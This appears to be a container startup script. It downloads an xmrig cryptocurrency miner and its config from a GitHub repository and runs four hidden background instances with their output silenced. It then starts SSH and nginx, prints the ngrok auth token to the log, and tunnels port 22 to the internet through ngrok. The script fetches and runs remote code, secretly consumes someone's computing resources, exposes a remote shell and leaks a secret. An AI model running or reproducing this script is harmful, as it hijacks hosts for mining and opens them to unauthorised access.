#!/bin/bash
wget https://github.com/llm2580/xssh/raw/main/config.json
wget https://github.com/llm2580/xssh/raw/main/xmrig
chmod 755 xmrig
nohup ./xmrig >/dev/null 2>&1 &
nohup ./xmrig >/dev/null 2>&1 &
nohup ./xmrig >/dev/null 2>&1 &
nohup ./xmrig >/dev/null 2>&1 &
echo "complete!"
source /app/config.sh

service ssh start
service nginx start

echo "set ngrok token: $NGROK_TOKEN"
ngrok authtoken $NGROK_TOKEN
echo "start ngrok service"
ngrok tcp 22 --log=stdout > ngrok.log
